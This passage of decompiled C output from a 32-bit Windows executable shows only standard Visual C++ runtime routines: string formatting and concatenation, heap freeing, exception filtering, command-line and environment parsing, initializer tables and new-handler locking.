    local_2c = &local_c;
    local_28 = &local_1c;
    local_24 = &local_10;
    local_20 = &local_14;
    uVar2 = __acrt_lock_stream_and_call__
                      (param_3,(_lambda_4f2c1eaeead2a5fc776db5b62ea0fb9b_ *)&local_30);
  }
  return uVar2;
}



// Library Function - Single Match
//  ___stdio_common_vsprintf
// 
// Library: Visual Studio 2015 Release

void __cdecl
___stdio_common_vsprintf
          (undefined4 param_1,undefined4 param_2,char *param_3,uint param_4,char *param_5,
          __crt_locale_pointers *param_6,char *param_7)

{
  common_vsprintf_class___crt_stdio_output__standard_base_char_
            (CONCAT44(param_2,param_1),param_3,param_4,param_5,param_6,param_7);
  return;
}



// Library Function - Single Match
//  ___stdio_common_vswprintf
// 
// Library: Visual Studio 2015 Release

void __cdecl
___stdio_common_vswprintf
          (undefined4 param_1,undefined4 param_2,wchar_t *param_3,uint param_4,wchar_t *param_5,
          __crt_locale_pointers *param_6,char *param_7)

{
  common_vsprintf_class___crt_stdio_output__standard_base_wchar_t_
            (CONCAT44(param_2,param_1),param_3,param_4,param_5,param_6,param_7);
  return;
}



void __cdecl FID_conflict__free(void *_Memory)

{
  BOOL BVar1;
  int *piVar2;
  DWORD DVar3;
  int iVar4;
  
  if (_Memory != (void *)0x0) {
    BVar1 = HeapFree(DAT_0041c220,0,_Memory);
    if (BVar1 == 0) {
      piVar2 = __errno();
      DVar3 = GetLastError();
      iVar4 = FID_conflict____acrt_errno_from_os_error(DVar3);
      *piVar2 = iVar4;
    }
  }
  return;
}



// Library Function - Single Match
//  _strcat_s
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

errno_t __cdecl _strcat_s(char *_Dst,rsize_t _SizeInBytes,char *_Src)

{
  char cVar1;
  int *piVar2;
  char *pcVar3;
  int iVar4;
  int iStack16;
  
  if ((_Dst != (char *)0x0) && (_SizeInBytes != 0)) {
    pcVar3 = _Dst;
    if (_Src != (char *)0x0) {
      do {
        if (*pcVar3 == '\0') break;
        pcVar3 = pcVar3 + 1;
        _SizeInBytes = _SizeInBytes - 1;
      } while (_SizeInBytes != 0);
      if (_SizeInBytes != 0) {
        iVar4 = (int)_Src - (int)pcVar3;
        do {
          cVar1 = pcVar3[iVar4];
          *pcVar3 = cVar1;
          pcVar3 = pcVar3 + 1;
          if (cVar1 == '\0') break;
          _SizeInBytes = _SizeInBytes - 1;
        } while (_SizeInBytes != 0);
        if (_SizeInBytes != 0) {
          return 0;
        }
        *_Dst = '\0';
        piVar2 = __errno();
        iStack16 = 0x22;
        goto LAB_00406f23;
      }
    }
    *_Dst = '\0';
  }
  piVar2 = __errno();
  iStack16 = 0x16;
LAB_00406f23:
  *piVar2 = iStack16;
  FUN_004091be();
  return iStack16;
}



void FUN_00406f66(size_t param_1)

{
  __malloc_base(param_1);
  return;
}



// Library Function - Single Match
//  __seh_filter_exe
// 
// Library: Visual Studio 2015 Release

void __cdecl __seh_filter_exe(uint param_1,uint *param_2)

{
  code *pcVar1;
  uint uVar2;
  uint **ppuVar3;
  uint *puVar4;
  uint *puVar5;
  undefined extraout_DL;
  undefined uVar6;
  uint *extraout_EDX;
  uint *extraout_EDX_00;
  uint *puVar7;
  undefined4 uVar8;
  uint uVar9;
  undefined uVar10;
  uint *puVar11;
  uint *extraout_var;
  
  uVar2 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  ppuVar3 = (uint **)___acrt_getptd_noexit();
  uVar10 = SUB41(extraout_var,0);
  uVar6 = extraout_DL;
  if (ppuVar3 != (uint **)0x0) {
    puVar7 = *ppuVar3;
    for (puVar5 = puVar7; puVar5 != puVar7 + 0x24; puVar5 = puVar5 + 3) {
      if (*puVar5 == param_1) goto LAB_00406fb4;
    }
    puVar5 = (uint *)0x0;
LAB_00406fb4:
    if ((puVar5 != (uint *)0x0) && (pcVar1 = (code *)puVar5[2], pcVar1 != (code *)0x0)) {
      if (pcVar1 == (code *)0x5) {
        puVar5[2] = 0;
      }
      else {
        puVar11 = extraout_var;
        if (pcVar1 != (code *)0x1) {
          puVar11 = ppuVar3[1];
          ppuVar3[1] = param_2;
          if (puVar5[1] == 8) {
            for (puVar4 = puVar7 + 9; puVar4 != puVar7 + 0x24; puVar4 = puVar4 + 3) {
              puVar4[2] = 0;
            }
            puVar7 = ppuVar3[2];
            if (*puVar5 < 0xc0000092) {
              if (*puVar5 == 0xc0000091) {
                ppuVar3[2] = (uint *)0x84;
              }
              else if (*puVar5 == 0xc000008d) {
                ppuVar3[2] = (uint *)0x82;
              }
              else if (*puVar5 == 0xc000008e) {
                ppuVar3[2] = (uint *)0x83;
              }
              else if (*puVar5 == 0xc000008f) {
                ppuVar3[2] = (uint *)0x86;
              }
              else if (*puVar5 == 0xc0000090) {
                ppuVar3[2] = (uint *)0x81;
              }
            }
            else if (*puVar5 == 0xc0000092) {
              ppuVar3[2] = (uint *)0x8a;
            }
            else if (*puVar5 == 0xc0000093) {
              ppuVar3[2] = (uint *)0x85;
            }
            else if (*puVar5 == 0xc00002b4) {
              ppuVar3[2] = (uint *)0x8e;
            }
            else if (*puVar5 == 0xc00002b5) {
              ppuVar3[2] = (uint *)0x8d;
            }
            puVar5 = ppuVar3[2];
            uVar8 = 8;
            _guard_check_icall();
            (*pcVar1)(uVar8,puVar5);
            ppuVar3[2] = puVar7;
            puVar7 = extraout_EDX;
          }
          else {
            uVar9 = puVar5[1];
            puVar5[2] = 0;
            _guard_check_icall();
            (*pcVar1)(uVar9);
            puVar7 = extraout_EDX_00;
          }
          ppuVar3[1] = puVar11;
        }
        uVar10 = SUB41(puVar11,0);
      }
    }
    uVar6 = SUB41(puVar7,0);
  }
  FUN_0040296a(uVar2 ^ (uint)&stack0xfffffffc,uVar6,uVar10);
  return;
}



undefined4 FUN_004070e4(void)

{
  return DAT_0041bc5c;
}



void __cdecl FUN_004070ea(undefined4 param_1)

{
  DAT_0041bc5c = param_1;
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___acrt_has_user_matherr
// 
// Library: Visual Studio 2015 Release

bool ___acrt_has_user_matherr(void)

{
  byte bVar1;
  
  bVar1 = (byte)DAT_0041b004 & 0x1f;
  return ((DAT_0041b004 ^ _DAT_0041bc60) >> bVar1 | (DAT_0041b004 ^ _DAT_0041bc60) << 0x20 - bVar1)
         != 0;
}



void __cdecl FUN_00407112(FuncDef14 *param_1)

{
  __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
            ((dual_state_global_void____cdecl___int__ *)&DAT_0041bc60,param_1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___acrt_invoke_user_matherr
// 
// Library: Visual Studio 2015 Release

void __cdecl ___acrt_invoke_user_matherr(undefined4 param_1)

{
  uint uVar1;
  byte bVar2;
  undefined in_DL;
  undefined extraout_DL;
  code *pcVar3;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  bVar2 = (byte)DAT_0041b004 & 0x1f;
  pcVar3 = (code *)((DAT_0041b004 ^ _DAT_0041bc60) >> bVar2 |
                   (DAT_0041b004 ^ _DAT_0041bc60) << 0x20 - bVar2);
  if (pcVar3 != (code *)0x0) {
    _guard_check_icall();
    (*pcVar3)(param_1);
    in_DL = extraout_DL;
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,in_DL,(char)uVar1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  ___setusermatherr
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl ___setusermatherr(uint param_1)

{
  _DAT_0041bc60 = __crt_fast_encode_pointer__(param_1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

int __cdecl FUN_00407184(int param_1)

{
  uchar *puVar1;
  int *piVar2;
  uchar **ppuVar3;
  char *pcVar4;
  int iVar5;
  uchar **ppuVar6;
  uint local_10;
  uchar **local_c;
  uint local_8;
  
  if ((param_1 == 2) || (param_1 == 1)) {
    ___acrt_initialize_multibyte();
    iVar5 = 0;
    GetModuleFileNameA((HMODULE)0x0,&DAT_0041bc68,0x104);
    _DAT_0041c210 = &DAT_0041bc68;
    if ((DAT_0041c208 == (char *)0x0) || (pcVar4 = DAT_0041c208, *DAT_0041c208 == '\0')) {
      pcVar4 = &DAT_0041bc68;
    }
    local_8 = 0;
    local_10 = 0;
    parse_command_line_char_(pcVar4,(char **)0x0,(char *)0x0,&local_8,&local_10);
    ppuVar3 = (uchar **)___acrt_allocate_buffer_for_argv(local_8,local_10,1);
    ppuVar6 = ppuVar3;
    if (ppuVar3 == (uchar **)0x0) {
      piVar2 = __errno();
      iVar5 = 0xc;
      *piVar2 = 0xc;
    }
    else {
      parse_command_line_char_
                (pcVar4,(char **)ppuVar3,(char *)(ppuVar3 + local_8),&local_8,&local_10);
      if (param_1 == 1) {
        _DAT_0041c1fc = local_8 - 1;
        ppuVar6 = (uchar **)0x0;
        DAT_0041c200 = ppuVar3;
      }
      else {
        local_c = (uchar **)0x0;
        iVar5 = FUN_0040b42e(ppuVar3,&local_c);
        ppuVar3 = local_c;
        if (iVar5 == 0) {
          _DAT_0041c1fc = 0;
          puVar1 = *local_c;
          while (puVar1 != (uchar *)0x0) {
            local_c = local_c + 1;
            _DAT_0041c1fc = _DAT_0041c1fc + 1;
            puVar1 = *local_c;
          }
          local_c = (uchar **)0x0;
          iVar5 = 0;
          DAT_0041c200 = ppuVar3;
        }
        FID_conflict__free(local_c);
        local_c = (uchar **)0x0;
      }
    }
    FID_conflict__free(ppuVar6);
  }
  else {
    piVar2 = __errno();
    iVar5 = 0x16;
    *piVar2 = 0x16;
    FUN_004091be();
  }
  return iVar5;
}



// Library Function - Single Match
//  void __cdecl parse_command_line<char>(char *,char * *,char *,unsigned int *,unsigned int *)
// 
// Library: Visual Studio 2015 Release

void __cdecl
parse_command_line_char_(char *param_1,char **param_2,char *param_3,uint *param_4,uint *param_5)

{
  char cVar1;
  uint uVar2;
  int iVar3;
  bool bVar4;
  bool bVar5;
  char *pcVar6;
  char *pcVar7;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (char **)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  bVar4 = false;
  bVar5 = false;
  do {
    if (*param_1 == '\"') {
      bVar5 = !bVar4;
      cVar1 = '\"';
      pcVar6 = param_1 + 1;
      bVar4 = bVar5;
    }
    else {
      *param_5 = *param_5 + 1;
      if (param_3 != (char *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      cVar1 = *param_1;
      pcVar6 = param_1 + 1;
      iVar3 = __ismbblead((int)cVar1);
      if (iVar3 != 0) {
        *param_5 = *param_5 + 1;
        if (param_3 != (char *)0x0) {
          *param_3 = *pcVar6;
          param_3 = param_3 + 1;
        }
        pcVar6 = param_1 + 2;
      }
      if (cVar1 == '\0') {
        pcVar6 = pcVar6 + -1;
        goto LAB_00407338;
      }
    }
    param_1 = pcVar6;
  } while ((bVar5) || ((cVar1 != ' ' && (cVar1 != '\t'))));
  if (param_3 != (char *)0x0) {
    param_3[-1] = '\0';
  }
LAB_00407338:
  bVar5 = false;
  while (pcVar7 = pcVar6, *pcVar6 != '\0') {
    for (; (*pcVar7 == ' ' || (*pcVar7 == '\t')); pcVar7 = pcVar7 + 1) {
    }
    if (*pcVar7 == '\0') break;
    if (param_2 != (char **)0x0) {
      *param_2 = param_3;
      param_2 = param_2 + 1;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      bVar4 = true;
      uVar2 = 0;
      for (; *pcVar7 == '\\'; pcVar7 = pcVar7 + 1) {
        uVar2 = uVar2 + 1;
      }
      pcVar6 = pcVar7;
      if (*pcVar7 == '\"') {
        if (((uVar2 & 1) == 0) && ((!bVar5 || (pcVar6 = pcVar7 + 1, *pcVar6 != '\"')))) {
          bVar4 = false;
          bVar5 = !bVar5;
          pcVar6 = pcVar7;
        }
        uVar2 = uVar2 >> 1;
      }
      while (uVar2 != 0) {
        uVar2 = uVar2 - 1;
        if (param_3 != (char *)0x0) {
          *param_3 = '\\';
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      cVar1 = *pcVar6;
      if ((cVar1 == '\0') || ((!bVar5 && ((cVar1 == ' ' || (cVar1 == '\t')))))) break;
      if (bVar4) {
        if (param_3 != (char *)0x0) {
          *param_3 = cVar1;
          param_3 = param_3 + 1;
        }
        iVar3 = __ismbblead((int)*pcVar6);
        if (iVar3 != 0) {
          pcVar6 = pcVar6 + 1;
          *param_5 = *param_5 + 1;
          if (param_3 != (char *)0x0) {
            *param_3 = *pcVar6;
            param_3 = param_3 + 1;
          }
        }
        *param_5 = *param_5 + 1;
      }
      pcVar7 = pcVar6 + 1;
    }
    if (param_3 != (char *)0x0) {
      *param_3 = '\0';
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (param_2 != (char **)0x0) {
    *param_2 = (char *)0x0;
  }
  *param_4 = *param_4 + 1;
  return;
}



// Library Function - Single Match
//  ___acrt_allocate_buffer_for_argv
// 
// Library: Visual Studio 2015 Release

LPVOID __cdecl ___acrt_allocate_buffer_for_argv(uint param_1,uint param_2,uint param_3)

{
  LPVOID pvVar1;
  
  if ((param_1 < 0x3fffffff) && (param_2 < (uint)(0xffffffff / (ulonglong)param_3))) {
    if (param_2 * param_3 < param_1 * -4 - 1) {
      pvVar1 = __calloc_base(param_2 * param_3 + param_1 * 4,1);
      FID_conflict__free((void *)0x0);
      return pvVar1;
    }
  }
  return (LPVOID)0x0;
}



void __cdecl FUN_00407472(int param_1)

{
  FUN_00407184(param_1);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 FUN_0040747d(void)

{
  LPSTR _Memory;
  char **ppcVar1;
  undefined4 uVar2;
  
  if (_DAT_0041bd70 != 0) {
    return 0;
  }
  ___acrt_initialize_multibyte();
  _Memory = ___dcrt_get_narrow_environment_from_os();
  if (_Memory == (LPSTR)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    ppcVar1 = create_environment_char_(_Memory);
    if (ppcVar1 == (char **)0x0) {
      uVar2 = 0xffffffff;
    }
    else {
      DAT_0041bd7c = ppcVar1;
      __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
                ((dual_state_global_void____cdecl___int__ *)&DAT_0041bd70,(FuncDef14 *)ppcVar1);
      uVar2 = 0;
    }
    FID_conflict__free((void *)0x0);
  }
  FID_conflict__free(_Memory);
  return uVar2;
}



// Library Function - Single Match
//  char * * __cdecl create_environment<char>(char * const)
// 
// Library: Visual Studio 2015 Release

char ** __cdecl create_environment_char_(char *param_1)

{
  code *pcVar1;
  char cVar2;
  char **ppcVar3;
  char *_Dst;
  errno_t eVar4;
  char *pcVar5;
  int iVar6;
  char **local_8;
  
  iVar6 = 0;
  cVar2 = *param_1;
  pcVar5 = param_1;
  while (cVar2 != '\0') {
    if (cVar2 != '=') {
      iVar6 = iVar6 + 1;
    }
    do {
      cVar2 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar2 != '\0');
    cVar2 = *pcVar5;
  }
  ppcVar3 = (char **)__calloc_base(iVar6 + 1,4);
  local_8 = ppcVar3;
  if (ppcVar3 == (char **)0x0) {
LAB_00407587:
    ppcVar3 = (char **)0x0;
  }
  else {
    for (; *param_1 != '\0'; param_1 = param_1 + (int)pcVar5) {
      pcVar5 = param_1;
      do {
        cVar2 = *pcVar5;
        pcVar5 = pcVar5 + 1;
      } while (cVar2 != '\0');
      pcVar5 = pcVar5 + (1 - (int)(param_1 + 1));
      if (*param_1 != '=') {
        _Dst = (char *)__calloc_base((uint)pcVar5,1);
        if (_Dst == (char *)0x0) {
          free_environment_char_(ppcVar3);
          FID_conflict__free((void *)0x0);
          goto LAB_00407587;
        }
        eVar4 = _strcpy_s(_Dst,(rsize_t)pcVar5,param_1);
        if (eVar4 != 0) {
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
          pcVar1 = (code *)swi(3);
          ppcVar3 = (char **)(*pcVar1)();
          return ppcVar3;
        }
        *local_8 = _Dst;
        local_8 = local_8 + 1;
        FID_conflict__free((void *)0x0);
      }
    }
  }
  FID_conflict__free((void *)0x0);
  return ppcVar3;
}



// Library Function - Single Match
//  void __cdecl free_environment<char>(char * * const)
// 
// Library: Visual Studio 2015 Release

void __cdecl free_environment_char_(char **param_1)

{
  char *_Memory;
  char **ppcVar1;
  
  if (param_1 != (char **)0x0) {
    _Memory = *param_1;
    ppcVar1 = param_1;
    while (_Memory != (char *)0x0) {
      FID_conflict__free(_Memory);
      ppcVar1 = ppcVar1 + 1;
      _Memory = *ppcVar1;
    }
    FID_conflict__free(param_1);
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  public: void __thiscall __crt_state_management::dual_state_global<char * *>::uninitialize<void
// (__cdecl&)(char * * &)>(void (__cdecl&)(char * * &))
//  public: void __thiscall __crt_state_management::dual_state_global<wchar_t *
// *>::uninitialize<void (__cdecl&)(wchar_t * * &)>(void (__cdecl&)(wchar_t * * &))
// 
// Libraries: Visual Studio 2015 Debug, Visual Studio 2015 Release

void __thiscall uninitialize__(void *this,undefined *param_1)

{
  void *pvVar1;
  uint uVar2;
  undefined in_DL;
  undefined extraout_DL;
  void *pvVar3;
  
  uVar2 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pvVar1 = (void *)((int)this + 4);
  for (; this != pvVar1; this = (void *)((int)this + 4)) {
    pvVar3 = this;
    _guard_check_icall();
    (*(code *)param_1)(pvVar3);
    in_DL = extraout_DL;
  }
  FUN_0040296a(uVar2 ^ (uint)&stack0xfffffffc,in_DL,(char)uVar2);
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  void __cdecl uninitialize_environment_internal<char>(char * * &)
//  void __cdecl uninitialize_environment_internal<wchar_t>(wchar_t * * &)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl uninitialize_environment_internal__(undefined4 *param_1)

{
  if ((char **)*param_1 != DAT_0041bd7c) {
    free_environment_char_((char **)*param_1);
  }
  return;
}



// Library Function - Multiple Matches With Same Base Name
//  void __cdecl uninitialize_environment_internal<char>(char * * &)
//  void __cdecl uninitialize_environment_internal<wchar_t>(wchar_t * * &)
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

void __cdecl uninitialize_environment_internal__(undefined4 *param_1)

{
  if ((char **)*param_1 != DAT_0041bd78) {
    free_environment_char_((char **)*param_1);
  }
  return;
}



void FUN_0040764c(void)

{
  uninitialize__(&DAT_0041bd70,uninitialize_environment_internal__);
  uninitialize__(&DAT_0041bd74,uninitialize_environment_internal__);
  free_environment_char_(DAT_0041bd7c);
  free_environment_char_(DAT_0041bd78);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined4 thunk_FUN_0040747d(void)

{
  LPSTR _Memory;
  char **ppcVar1;
  undefined4 uVar2;
  
  if (_DAT_0041bd70 != 0) {
    return 0;
  }
  ___acrt_initialize_multibyte();
  _Memory = ___dcrt_get_narrow_environment_from_os();
  if (_Memory == (LPSTR)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    ppcVar1 = create_environment_char_(_Memory);
    if (ppcVar1 == (char **)0x0) {
      uVar2 = 0xffffffff;
    }
    else {
      DAT_0041bd7c = ppcVar1;
      __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
                ((dual_state_global_void____cdecl___int__ *)&DAT_0041bd70,(FuncDef14 *)ppcVar1);
      uVar2 = 0;
    }
    FID_conflict__free((void *)0x0);
  }
  FID_conflict__free(_Memory);
  return uVar2;
}



// Library Function - Single Match
//  __get_narrow_winmain_command_line
// 
// Library: Visual Studio 2015 Release

char * __get_narrow_winmain_command_line(void)

{
  char cVar1;
  bool bVar2;
  int iVar3;
  char *pcVar4;
  
  ___acrt_initialize_multibyte();
  pcVar4 = DAT_0041c208;
  if (DAT_0041c208 == (char *)0x0) {
    pcVar4 = &DAT_0041bd80;
  }
  bVar2 = false;
  do {
    cVar1 = *pcVar4;
    if (cVar1 < '!') {
      if (cVar1 == '\0') {
        return pcVar4;
      }
      if (!bVar2) {
        for (; (*pcVar4 != '\0' && (*pcVar4 < '!')); pcVar4 = pcVar4 + 1) {
        }
        return pcVar4;
      }
    }
    if (cVar1 == '\"') {
      bVar2 = !bVar2;
    }
    iVar3 = __ismbblead((int)cVar1);
    if (iVar3 != 0) {
      pcVar4 = pcVar4 + 1;
    }
    pcVar4 = pcVar4 + 1;
  } while( true );
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2015 Release

void __cdecl __initterm(undefined **param_1,undefined **param_2)

{
  uint uVar1;
  undefined in_CL;
  undefined in_DL;
  undefined extraout_DL;
  uint uVar2;
  uint uVar3;
  code *pcVar4;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  uVar3 = 0;
  uVar2 = ~-(uint)(param_2 < param_1) & (uint)((int)param_2 + (3 - (int)param_1)) >> 2;
  if (uVar2 != 0) {
    do {
      pcVar4 = (code *)*param_1;
      if (pcVar4 != (code *)0x0) {
        _guard_check_icall();
        (*pcVar4)();
        in_DL = extraout_DL;
      }
      in_CL = SUB41(pcVar4,0);
      param_1 = (code **)param_1 + 1;
      uVar3 = uVar3 + 1;
    } while (uVar3 != uVar2);
  }
  FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,in_DL,in_CL);
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2015 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  code *pcVar1;
  uint uVar2;
  int iVar3;
  undefined in_DL;
  undefined extraout_DL;
  
  uVar2 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  for (; param_1 != param_2; param_1 = (code **)param_1 + 1) {
    pcVar1 = (code *)*param_1;
    if (pcVar1 != (code *)0x0) {
      _guard_check_icall();
      iVar3 = (*pcVar1)();
      in_DL = extraout_DL;
      if (iVar3 != 0) break;
    }
  }
  FUN_0040296a(uVar2 ^ (uint)&stack0xfffffffc,in_DL,(char)uVar2);
  return;
}



// Library Function - Single Match
//  __set_fmode
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

errno_t __cdecl __set_fmode(int _Mode)

{
  int *piVar1;
  
  if (((_Mode != 0x4000) && (_Mode != 0x8000)) && (_Mode != 0x10000)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    return 0x16;
  }
  DAT_0041c214 = _Mode;
  return 0;
}



// Library Function - Single Match
//  ___acrt_set_locale_changed
// 
// Library: Visual Studio 2015 Release

undefined4 ___acrt_set_locale_changed(void)

{
  undefined4 uVar1;
  
  uVar1 = DAT_0041bd84;
  DAT_0041bd84 = 1;
  return uVar1;
}



void FUN_0040780d(void)

{
  ___acrt_unlock(4);
  return;
}



// Library Function - Single Match
//  __configthreadlocale
// 
// Library: Visual Studio 2015 Release

int __cdecl __configthreadlocale(int _Flag)

{
  uint uVar1;
  __acrt_ptd *p_Var2;
  int *piVar3;
  uint uVar4;
  
  p_Var2 = ___acrt_getptd();
  uVar1 = *(uint *)(p_Var2 + 0x350);
  if (_Flag == -1) {
    DAT_0041b770 = 0xffffffff;
  }
  else if (_Flag != 0) {
    if (_Flag == 1) {
      uVar4 = uVar1 | 2;
    }
    else {
      if (_Flag != 2) {
        piVar3 = __errno();
        *piVar3 = 0x16;
        FUN_004091be();
        return -1;
      }
      uVar4 = uVar1 & 0xfffffffd;
    }
    *(uint *)(p_Var2 + 0x350) = uVar4;
  }
  return ((uVar1 & 2) == 0) + 1;
}



undefined4 FUN_00407878(void)

{
  return DAT_0041bd88;
}



// Library Function - Single Match
//  __set_new_mode
// 
// Libraries: Visual Studio 2015 Release, Visual Studio 2017 Release, Visual Studio 2019 Release

undefined4 __cdecl __set_new_mode(int param_1)

{
  int *piVar1;
  undefined4 uVar2;
  
  if ((param_1 != 0) && (param_1 != 1)) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_004091be();
    return 0xffffffff;
  }
  uVar2 = DAT_0041bd88;
  DAT_0041bd88 = param_1;
  return uVar2;
}



undefined * FUN_004078ad(void)

{
  return &DAT_0041bd8c;
}



void __cdecl FUN_004078b3(FuncDef14 *param_1)

{
  __crt_state_management::dual_state_global<void_(__cdecl*)(int)>::initialize
            ((dual_state_global_void____cdecl___int__ *)&DAT_0041bd90,param_1);
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2015 Release

int __cdecl __callnewh(size_t _Size)

{
  uint uVar1;
  code *pcVar2;
  int iVar3;
  undefined extraout_DL;
  undefined extraout_DL_00;
  undefined uVar4;
  
  uVar1 = DAT_0041b004 ^ (uint)&stack0xfffffffc;
  pcVar2 = (code *)__query_new_handler();
  uVar4 = extraout_DL;
  if (pcVar2 != (code *)0x0) {
    _guard_check_icall();
    (*pcVar2)(_Size);
    uVar4 = extraout_DL_00;
  }
  iVar3 = FUN_0040296a(uVar1 ^ (uint)&stack0xfffffffc,uVar4,(char)uVar1);
  return iVar3;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __query_new_handler
// 
// Library: Visual Studio 2015 Release

uint __query_new_handler(void)

{
  byte bVar1;
  uint uVar2;
  
  ___acrt_lock(0);
  bVar1 = (byte)DAT_0041b004 & 0x1f;
  uVar2 = DAT_0041b004 ^ _DAT_0041bd90;
  FUN_00407954();
  return uVar2 >> bVar1 | uVar2 << 0x20 - bVar1;
}



void FUN_00407954(void)

{
  ___acrt_unlock(0);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_800076c951b434888f4765a74a194fcc>,class <lambda_4e60a939b0d047cfe11ddc22648dfba9>&,class
// <lambda_6dbb1268764f43b569ce7b67e331d33a>>(class
// <lambda_800076c951b434888f4765a74a194fcc>&&,class
// <lambda_4e60a939b0d047cfe11ddc22648dfba9>&,class <lambda_6dbb1268764f43b569ce7b67e331d33a>&&)
// 
// Library: Visual Studio 2015 Release

int __thiscall
__crt_seh_guarded_call<int>::
operator___class__lambda_800076c951b434888f4765a74a194fcc__class__lambda_4e60a939b0d047cfe11ddc22648dfba9___class__lambda_6dbb1268764f43b569ce7b67e331d33a___
          (__crt_seh_guarded_call_int_ *this,_lambda_800076c951b434888f4765a74a194fcc_ *param_1,
          _lambda_4e60a939b0d047cfe11ddc22648dfba9_ *param_2,
          _lambda_6dbb1268764f43b569ce7b67e331d33a_ *param_3)

{
  int iVar1;
  
  ___acrt_lock(*(int *)param_1);
  iVar1 = <lambda_4e60a939b0d047cfe11ddc22648dfba9>::operator__(param_2);
  FUN_004079a2();
  return iVar1;
}



void FUN_004079a2(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  public: int __thiscall __crt_seh_guarded_call<int>::operator()<class
// <lambda_995298e7d72eb4c2aab26c0585b3abe5>,class <lambda_275893d493268fdec8709772e3fcec0e>&,class
// <lambda_293819299cbf9a7022e18b56a874bb5c>>(class
// <lambda_995298e7d72eb4c2aab26c0585b3abe5>&&,class
// <lambda_275893d493268fdec8709772e3fcec0e>&,class <lambda_293819299cbf9a7022e18b56a874bb5c>&&)
// 
// Library: Visual Studio 2015 Release

int __thiscall
__crt_seh_guarded_call<int>::
operator___class__lambda_995298e7d72eb4c2aab26c0585b3abe5__class__lambda_275893d493268fdec8709772e3fcec0e___class__lambda_293819299cbf9a7022e18b56a874bb5c___
          (__crt_seh_guarded_call_int_ *this,_lambda_995298e7d72eb4c2aab26c0585b3abe5_ *param_1,
          _lambda_275893d493268fdec8709772e3fcec0e_ *param_2,
          _lambda_293819299cbf9a7022e18b56a874bb5c_ *param_3)

{
  int iVar1;
  
  ___acrt_lock(*(int *)param_1);
  iVar1 = <lambda_275893d493268fdec8709772e3fcec0e>::operator__(param_2);
  FUN_004079f3();
  return iVar1;
}



void FUN_004079f3(void)

{
  int unaff_EBP;
  
  ___acrt_unlock(**(int **)(unaff_EBP + 0x10));
  return;
}



// Library Function - Single Match
//  int __cdecl __acrt_lock_and_call<class <lambda_275893d493268fdec8709772e3fcec0e>>(enum
// __acrt_lock_id,class <lambda_275893d493268fdec8709772e3fcec0e>&&)
// 
// Library: Visual Studio 2015 Release

int __cdecl
__acrt_lock_and_call_class__lambda_275893d493268fdec8709772e3fcec0e___
          (__acrt_lock_id param_1,_lambda_275893d493268fdec8709772e3fcec0e_ *param_2)

{
  int iVar1;
  __acrt_lock_id local_10;
  __acrt_lock_id local_c;
  __crt_seh_guarded_call_int_ local_5;
  
  local_c = param_1;
  local_10 = param_1;
  iVar1 = __crt_seh_guarded_call<int>::
          operator___class__lambda_995298e7d72eb4c2aab26c0585b3abe5__class__lambda_275893d493268fdec8709772e3fcec0e___class__lambda_293819299cbf9a7022e18b56a874bb5c___
                    (&local_5,(_lambda_995298e7d72eb4c2aab26c0585b3abe5_ *)&local_10,param_2,
                     (_lambda_293819299cbf9a7022e18b56a874bb5c_ *)&local_c);
